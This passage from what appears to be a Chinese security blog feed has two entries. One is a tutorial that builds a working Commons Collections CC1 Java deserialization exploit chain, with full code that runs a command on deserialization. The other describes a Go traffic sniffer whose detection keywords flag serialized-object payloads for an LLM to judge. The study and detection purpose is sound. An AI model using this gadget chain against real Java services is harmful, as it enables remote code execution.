alt="image-20240709171213495"></p><p>私有构造函数使用反射获取，修改访问权限即可。该构造函数第一个参数要求继承了Annotation接口，实际上就是要求传入注解类型，比如常用的注解Override，Target</p><blockquote><p>可以继承接口或者实现接口。</p><ul><li>继承接口extends指的是接口之间的关系，其中一个接口扩展另一个接口，从而获得其方法和常量。</li><li>实现接口implements指的是类与接口之间的关系，其中类提供了接口中定义的所有抽象方法的具体实现。</li></ul></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709171748034.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709171748034.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709171748034"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandlerConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">AnnotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br></pre></td></tr></table></figure><h3 id="满足if条件"><a href="#满足if条件" class="headerlink" title="满足if条件"></a>满足if条件</h3><p>现在构造的主代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandlerConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">AnnotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br></pre></td></tr></table></figure><p>需要满足这两个if判断才能进到setValue，这里的name是通过getKey()取的“键”，即<code>map.put(&quot;key&quot;,null)</code>的”key”</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709173152920.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709173152920.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709173152920"></p><h4 id="满足if-memberType-x3D-null"><a href="#满足if-memberType-x3D-null" class="headerlink" title="满足if (memberType !&#x3D; null)"></a>满足if (memberType !&#x3D; null)</h4><p>在上文的annotationType是调用getInstance()函数，获取给定注解类的AnnotationType实例，内部使用了CAS操作，具体很复杂，不在此深入了解。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709222252382.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709222252382.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709222252382"></p><p>但在getInstance内部有一句，调用了其私有构造函数</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223750355.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223750355.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709223750355"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223816042.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223816042.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709223816042"></p><p>构造函数把该注解类内部的所有方法名 put进了memberTypes</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711170419681.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240711170419681.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240711170419681"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223850683.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223850683.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709223850683"></p><p>在调用annotation.memberTypes时，就返回了这个(name,invocationhandlerReturnType(type))的Map，</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709221815962.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709221815962.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709221815962"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223944354.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709223944354.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709223944354"></p><p>总结一下，AnnotationInvocationHandler的readObject内的<code>Class&lt;?&gt; memberType = memberTypes.get(name);</code>做了什么呢？就是取出注解类中为name的方法名。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709224154670.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709224154670.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709224154670"></p><p>比如Target注解内有value方法，如果name值为value，是不是memberType就是value？紧随其后的if判断就为真，因为get到了其值。如果name为其他字符串，就get不到值，自然if判断为假，进不了内部</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709224402111.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709224402111.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709224402111"></p><h3 id="满足第二个if"><a href="#满足第二个if" class="headerlink" title="满足第二个if"></a>满足第二个if</h3><p>isInstance是一个native（C或C++实现的本地代码，不能看到代码内容）方法，作用是判断指定的对象是否是该类或其子类的实例，我们put进的value为null，当然不是。第二个判断是value值是否为异常代理类的实例（isInstance和instanceof的作用一样）</p><p>即第二个填null之外的大部分字符串都能符合要求</p><h3 id="改变setValue参数值"><a href="#改变setValue参数值" class="headerlink" title="改变setValue参数值"></a>改变setValue参数值</h3><p>这里的setValue是他赋予的值，我们要求传入的setValue参数值需要为Runtime.class，见上文代码4</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709225420898.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709225420898.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709225420898"></p><p>回想一下，我们是在哪需要这个Runtime.class？是在代码2中的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span>(Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>只是在后面构造时一步一步用不同的函数传参，先是chainedTransformer，又是setValue</p><p>既然是在最开始的InvokerTransformer.transform中使用，刚好有一个Transformer，叫ConstantTransformer。构造函数传入常量，然后其transformer返回该常量。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709231907392.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709231907392.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>那在ChainedTransformer调用最开始加一个实例化ConstantTransformer，传入Runtime.class不就完了？即：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样就根本不用管setValue传什么了。</p><p>完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        Constructor&lt;?&gt; AnnotationInvocationHandlerConstructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> AnnotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        serialize(annotationInvocationHandler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">&quot;serialize&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(Filename)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialize&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709235653625.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709235653625.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709235653625"></p><h3 id="调式复测"><a href="#调式复测" class="headerlink" title="调式复测"></a>调式复测</h3><p>在反序列化出打上断点，一路步进就能看到完整过程。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240710110144246.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240710110144246.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240710110144246"></p><p>调用链完整如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* ObjectInputStream.readObject()</span><br><span class="line">*           AnnotationInvocationHandler.readObject()</span><br><span class="line">*                 MapEntry.setValue()</span><br><span class="line">*                    TransformedMap.checkSetValue()</span><br><span class="line">*                       ChainedTransformer.transform()</span><br></pre></td></tr></table></figure><p>另外，我们在上文可以看到，LazyMap.get()也调用了transform方法，下一篇讲用LazyMap构造CC反序列化链</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164815135.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164815135.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>毕设</title>
      <link href="/2024/05/06/bi-she/"/>
      <url>/2024/05/06/bi-she/</url>
      
        <content type="html"><![CDATA[<h1 id="毕设"><a href="#毕设" class="headerlink" title="毕设"></a>毕设</h1><p>前言：距离上次的JAVA网上书城（完全够毕设工作量，毕设做JAVA可以看<a href="https://godownio.github.io/2023/05/20/java-shu-cheng-kai-fa-quan-liu-cheng/">https://godownio.github.io/2023/05/20/java-shu-cheng-kai-fa-quan-liu-cheng/</a> ）已经过去了一年了。花了半年考了个研，专业第二秒了，折合分421.5，数学爆砍126，但是我越发觉得读研是个傻逼干的事，纯没本事，哭了。不说了，转到正题。</p><p>本毕设fork自<a href="https://github.com/evepupil/ip_package">https://github.com/evepupil/ip_package</a> 。仿Wireshark纯抓包工具，加了个模糊匹配字节询问GPT是否为恶意数据。</p><p>成品图如下：</p><ul><li>恶意流量检测模块：</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/718010841cfdfab5a4b8d573e56bc2ab.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/718010841cfdfab5a4b8d573e56bc2ab.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="718010841cfdfab5a4b8d573e56bc2ab"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/08cfc52f4e4aae7b92ebca557f96b2dc.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/08cfc52f4e4aae7b92ebca557f96b2dc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="08cfc52f4e4aae7b92ebca557f96b2dc"></p><ul><li>全流量模块</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506163017511.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506163017511.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240506163017511"></p><p>加个狗屎UI花了三倍以上的代码和时间。</p><p>创新点：go本身线程安全（作为常驻WAF本身不易遭到攻击），gopacket基于Npcap，Winpcap升级版，goroutine协程效率高，资源消耗低。LLM判结果，方便且更新快。</p><h2 id="使用手册"><a href="#使用手册" class="headerlink" title="使用手册"></a>使用手册</h2><p>本工具已将阿里qwen LLM SDK拖到本地，请前往qwen_model.go修改ChatQWenModel为自己需要的LLM</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ChatQWenModel = <span class="string">&quot;qwen-turbo&quot;</span></span><br></pre></td></tr></table></figure><p>计费如下（越贵越慢，但是更准）：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506164052032.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506164052032.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240506164052032"></p><p>在http_copy.go#queryAI()把apiKey修改为自己的灵积API，请前往<a href="https://dashscope.console.aliyun.com/apiKey">https://dashscope.console.aliyun.com/apiKey</a></p><p>环境使用go 1.21.9，在1.1+都OK，c++环境使用TDM-GCC，需要安装fyne：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get fyne.io/fyne/v2</span><br></pre></td></tr></table></figure><p>点击<code>开始/切换</code>，一般选择Loopback做测试，Loopback是安装wireshark所带的本地环回地址网卡，监测以太网是无法监测到环回地址流量的。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506164734028.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506164734028.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240506164734028"></p><p>同理，全流量也选择网卡即可。</p><ul><li>全流量模式：可以使用菜单上所有功能，如过滤、排序、捕获等（严格模式：只接收来自IP包发往本机的数据包；混杂模式：接收发往其他主机，流经过本地的数据包）</li><li>HTTP流量分析模式：可以使用暂停继续，发送数据包功能。</li></ul><p>在runRequest()修改targetStrings匹配规则</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">targetStrings := []<span class="type">string</span>&#123;<span class="string">&quot;rememberMe&quot;</span>, <span class="string">&quot;rO0A&quot;</span>, <span class="string">&quot;@type&quot;</span>, <span class="string">&quot;aced&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>还有个BUG，我在AI回答每隔31个字符插入一个回车，但是总是换行混乱。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">insertNewlineEveryNChars</span><span class="params">(s <span class="type">string</span>, n <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result <span class="type">string</span></span><br><span class="line">    <span class="keyword">for</span> i, r := <span class="keyword">range</span> s &#123;</span><br><span class="line">       result += <span class="type">string</span>(r)</span><br><span class="line">       <span class="keyword">if</span> (i+<span class="number">1</span>)%n == <span class="number">0</span> &amp;&amp; i+<span class="number">1</span> &lt; <span class="built_in">len</span>(s) &#123;</span><br><span class="line">          result += <span class="string">&quot;\n&quot;</span></span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为无法加入CA证书，所以暂时还不知道怎么分析加密的HTTPS流量，交给你们了。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>使用了embed打包静态数据，app.go#Run()函数为Fyne的阻塞函数，应用程序运行的主函数。</p><p>LoadMenus()加载菜单数据，在里面的切换响应的回调函数SetAllContainer(w, A)设置了列头。</p><p>相应的SetContainer(w, A)设置了另一个Container。全流量抓包逻辑在GetPkg()，HTTP抓包逻辑在GetHTTPPkg()。GetPkg()逻辑很好理解，一层一层跟下去看代码就行了</p><p>重点是GetHTTPPkg()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetHTTPPkg</span><span class="params">(ctx context.Context, device_str <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> util.Run()()</span><br><span class="line">    handle, err := pcap.OpenLive(device_str, snapshot_len, Promiscuous, timeout)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">       log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := handle.SetBPFFilter(*filter); err != <span class="literal">nil</span> &#123;</span><br><span class="line">       log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    No := <span class="number">1</span></span><br><span class="line">    <span class="comment">// Set up assembly</span></span><br><span class="line">    streamFactory := &amp;httpStreamFactory&#123;&#125;</span><br><span class="line">    streamPool := tcpassembly.NewStreamPool(streamFactory)</span><br><span class="line">    assembler := tcpassembly.NewAssembler(streamPool)</span><br><span class="line"></span><br><span class="line">    log.Println(<span class="string">&quot;reading in packets&quot;</span>)</span><br><span class="line">    <span class="comment">// Read in packets, pass to assembler.</span></span><br><span class="line">    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())</span><br><span class="line">    packets := packetSource.Packets()</span><br><span class="line">    ticker := time.Tick(time.Minute)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> Interupt == <span class="literal">false</span> &#123;</span><br><span class="line">          <span class="keyword">select</span> &#123;</span><br><span class="line">          <span class="keyword">case</span> packet := &lt;-packets:</span><br><span class="line">             <span class="comment">// A nil packet indicates the end of a pcap file.</span></span><br><span class="line">             <span class="keyword">if</span> packet == <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span> *logAllPackets &#123;</span><br><span class="line">                log.Println(packet)</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span> packet.NetworkLayer() == <span class="literal">nil</span> || 